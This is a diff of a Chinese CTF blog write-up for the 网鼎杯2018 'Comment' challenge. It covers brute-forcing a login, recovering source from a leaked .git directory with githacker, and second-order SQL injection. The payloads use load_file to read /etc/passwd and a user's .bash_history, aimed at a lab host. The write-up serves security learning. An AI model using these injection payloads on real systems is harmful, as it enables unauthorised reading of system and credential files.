@@ -6,34 +6,17 @@
   <meta name="keywords" content=" 代码审计 , 二次注入 , burpsuite爆破密码 , git文件泄露与复原 , githacker , select load_file读取文件 ">
   <meta name="description" content="网鼎杯2018-Comment | MIXBP">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
-<meta property="og:type" content="article">
-<meta property="og:title" content="docker学习">
-<meta property="og:url" content="https://mixbp.github.io/2026/09/14/docker%E5%AD%A6%E4%B9%A0/index.html">
+<meta name="description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
+<meta property="og:type" content="website">
+<meta property="og:title" content="about">
+<meta property="og:url" content="https://mixbp.github.io/about/index.html">
 <meta property="og:site_name" content="MIXBP">
-<meta property="og:description" content="docker学习初识docker安装docker12345678910# yum包更新yum update# 安装所需要的软件包yum install -y yum-utils device-mapper-persistent-date lvm2# 设置yum源yum-config-manager --add-repo https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;cento">
+<meta property="og:description" content="关于我MIXBP，Web 安全学习者，主攻 CTF Web 方向。  🎯 常打 BUUCTF、ctfshow、各类线下&#x2F;线上赛 📚 学习方向：PHP&#x2F;Java&#x2F;Python 安全、渗透测试、代码审计 🔗 GitHub：MIXBP  关于博客记录 CTF 刷题 writeup、比赛复现与安全学习笔记，内容仅供学习交流。 转载请注明来源，欢迎对文章中的引用来源进行考">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-2.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-3.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-5.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-4.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-6.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-7.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-8.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-9.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-10.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-11.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-12.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-13.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-14.png">
-<meta property="og:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-15.png">
-<meta property="article:published_time" content="2026-09-14T04:28:32.000Z">
-<meta property="article:modified_time" content="2026-09-18T11:22:32.136Z">
+<meta property="article:published_time" content="2026-11-16T09:30:00.000Z">
+<meta property="article:modified_time" content="2026-11-16T09:08:41.064Z">
 <meta property="article:author" content="MIXBP">
-<meta property="article:tag" content="docker">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://mixbp.github.io/image/docker%E5%AD%A6%E4%B9%A0-1.png">
 
 
 <link rel="icon" href="/img/favicon.png">
@@ -58,7 +41,8 @@
 
 <script src="/js/iconfont.js?v=1.1.0" ></script>
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MIXBP" type="application/atom+xml">
+</head>
 <div style="display: none">
   <input class="theme_disqus_on" value="false">
   <input class="theme_preload_comment" value="">
@@ -2215,7 +2199,7 @@
         
         <a  class="全部文章 java安全学习 "
            href="/2026/05/07/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6/"
-           data-tag="java反序列化,JNDI,RMI"
+           data-tag="JNDI,RMI,java反序列化"
            data-author="" >
             <span class="post-title" title="java反序列化进阶">java反序列化进阶</span>
             <span class="post-date" title="2026-05-07 01:23:24">2026/05/07</span>
@@ -2737,7 +2721,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/05/22/%E2%80%9C%E8%BD%A9%E8%BE%95%E6%9D%AF%E2%80%9D%E4%BA%91%E7%9B%BE%E7%A0%BA%E5%89%91CTF%E6%8C%91%E6%88%98%E8%B5%9B%E5%A4%8D%E7%8E%B0/"
-           data-tag="ssti,RCE,ssrf,sql"
+           data-tag="ssti,ssrf,RCE,sql"
            data-author="" >
             <span class="post-title" title="“轩辕杯”云盾砺剑CTF挑战赛复现">“轩辕杯”云盾砺剑CTF挑战赛复现</span>
             <span class="post-date" title="2025-05-22 23:37:59">2025/05/22</span>
@@ -2800,7 +2784,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/20/watevrCTF-2019-PickleStore/"
-           data-tag="反弹shell,python反序列化,外带数据,pickle反序列化"
+           data-tag="python反序列化,反弹shell,外带数据,pickle反序列化"
            data-author="" >
             <span class="post-title" title="watevrCTF-2019-PickleStore">watevrCTF-2019-PickleStore</span>
             <span class="post-date" title="2025-05-20 16:38:08">2025/05/20</span>
@@ -2872,7 +2856,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/05/11/SWPU2019-Web4/"
-           data-tag="代码审计,堆叠注入,时间盲注,16进制加SQL预处理绕过,PDO"
+           data-tag="代码审计,堆叠注入,16进制加SQL预处理绕过,时间盲注,PDO"
            data-author="" >
             <span class="post-title" title="SWPU2019-Web4">SWPU2019-Web4</span>
             <span class="post-date" title="2025-05-11 21:25:26">2025/05/11</span>
@@ -3169,7 +3153,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/04/15/BJDCTF2020-EzPHP/"
-           data-tag="代码审计,php特性,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
+           data-tag="php特性,代码审计,sha1绕过,extract,$_SERVER[&#39;QUERY_STRING&#39;],preg_match,create_function(),取反绕过单双引号过滤"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EzPHP">BJDCTF2020-EzPHP</span>
             <span class="post-date" title="2025-04-15 22:02:22">2025/04/15</span>
@@ -3187,7 +3171,7 @@
         
         <a  class="全部文章 比赛复现 "
            href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"
-           data-tag="sql注入,RCE,upload,明文攻击,CVE,目录穿越,内存马,时间盲注,压缩文件修复,时间帧隐写,docker"
+           data-tag="sql注入,upload,RCE,明文攻击,时间盲注,CVE,目录穿越,内存马,压缩文件修复,时间帧隐写,docker"
            data-author="" >
             <span class="post-title" title="TGCTF-2025复现">TGCTF-2025复现</span>
             <span class="post-date" title="2025-04-15 14:10:07">2025/04/15</span>
@@ -3376,7 +3360,7 @@
         
         <a  class="全部文章 刷题笔记 "
            href="/2025/03/30/BJDCTF2020-EasySearch1/"
-           data-tag="swp泄露,md5碰撞,代码审计,Apache SSI 远程命令执行漏洞"
+           data-tag="代码审计,swp泄露,md5碰撞,Apache SSI 远程命令执行漏洞"
            data-author="" >
             <span class="post-title" title="BJDCTF2020-EasySearch1">BJDCTF2020-EasySearch1</span>
             <span class="post-date" title="2025-03-30 14:24:01">2025/03/30</span>
@@ -4001,6 +3985,7 @@
     <div class="article-meta">
         
         <span>字数:2.3k</span>
+        <span>预计阅读 10 分钟</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -4047,9 +4032,9 @@
     <div class="article-entry" itemprop="articleBody">
       
         <h1 id="网鼎杯2018-Comment"><a href="#网鼎杯2018-Comment" class="headerlink" title="网鼎杯2018-Comment"></a>网鼎杯2018-Comment</h1><p>首先打开页面</p>
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-1.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-1.png"></p>
 <p>点击发帖，随便发点内容，然后自动给我们跳转到一个登录页面。</p>
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-2.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-2.png"></p>
 <p>给了我们账号和密码，但是密码的后三位没有告诉我们，我们可以使用burpsuite来爆破出密码，从1爆破到1000</p>
 <p>最后</p>
 <p>成功爆破出密码末尾三位为666，登录</p>
@@ -4059,9 +4044,9 @@
 <h2 id="githacker下载"><a href="#githacker下载" class="headerlink" title="githacker下载"></a>githacker下载</h2><p>登录之后又给我们跳转到了留言板，然后就没有其他信息了，这时候我们尝试使用githacker拿取git文件，</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">githacker</span> --url http://<span class="hljs-number">2</span>f62bda5-c550-<span class="hljs-number">4886</span>-<span class="hljs-number">88</span>c5-d7d119a8c5e4.node5.buuoj.cn:<span class="hljs-number">81</span>/.git --output-folder result<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-3.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-3.png"></p>
 <p>成功将write_do.php文件下载下来</p>
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-4.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-4.png"></p>
 <p>write_do.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
 
@@ -4069,7 +4054,7 @@
 <h2 id="复原git文件"><a href="#复原git文件" class="headerlink" title="复原git文件"></a>复原git文件</h2><p><strong>在cmd界面进入到write_do.php的路径来</strong></p>
 <figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">git <span class="hljs-built_in">log</span> <span class="hljs-comment">--all</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-5.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-5.png"></p>
 <p><strong>可以看到，head指针指向的是最早一次commit，通过<code>git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c</code> 命令将head指向第一个commit，得到完整的write_do.php</strong></p>
 <p>这下代码就完整了</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>
@@ -4090,10 +4075,10 @@
 <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;<span class="hljs-variable">$category</span>&#x27;,</span><br><span class="hljs-string">            content = &#x27;<span class="hljs-variable">$content</span>&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-variable">$bo_id</span>&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> 执行 SQL 语句<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure>
 
 <p>我们在category里面写入我们的语句，然后提交</p>
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-6.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-6.png"></p>
 <p>然后查看提交结果，在留言，也就是content参数，输入<code>*/#</code>，闭合前面（&#x2F;**&#x2F;注释）的本来的content，#用来注释后面的引号</p>
 <p>可以看到content一栏回显出来了数据库名</p>
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-7.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-7.png"></p>
 <h2 id="sql语句拼接原理："><a href="#sql语句拼接原理：" class="headerlink" title="sql语句拼接原理："></a>sql语句拼接原理：</h2><p>通过&#x2F;**&#x2F;将原来的content语句给闭合掉，并且用#将后面的引号注释掉</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">comment</span><br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;0&#x27;</span>,content=<span class="hljs-keyword">database</span>(),<span class="hljs-comment">/*&#x27;,</span><br><span class="hljs-comment">                content = &#x27;*/</span>#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>
 
@@ -4103,11 +4088,11 @@
 <hr>
 <h3 id="读取-etc-passwd文件"><a href="#读取-etc-passwd文件" class="headerlink" title="读取&#x2F;etc&#x2F;passwd文件"></a><strong>读取&#x2F;etc&#x2F;passwd文件</strong></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select (load_file(&#x27;</span><span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">&#x27;))),/*</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-8.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-8.png"></p>
 <h3 id="查看www用户的历史执行命令"><a href="#查看www用户的历史执行命令" class="headerlink" title="查看www用户的历史执行命令"></a>查看www用户的历史执行命令</h3><p>读取成功，可以知道www用户（一般和网站操作相关的用户，由中间件创建）的目录是&#x2F;home&#x2F;www，可以查询这下面的.bash_history</p>
 <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select (load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;))),/</span>*<br></code></pre></td></tr></table></figure>
 
-<p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-9.png"></p>
+<p><img loading="lazy" src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-9.png"></p>
 <p>这里可以看见，www用户进入到tmp目录下，解压了一个html的压缩文件，然后删除了压缩包，将解压了的文件拷贝到了&#x2F;var&#x2F;www&#x2F;html目录下，然后删除了.DS_Store，值得注意的是，他并没有删除&#x2F;tmp目录下解压出来的.DS_Store文件，所以我们就可以查看</p>
 <hr>
 <p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，<strong>目的在于存贮目录的自定义属性</strong>，例如文件们的图标位置或者是背景色的选择。<strong>通过.DS_Store可以知道这个目录里面所有文件的清单。</strong></p>
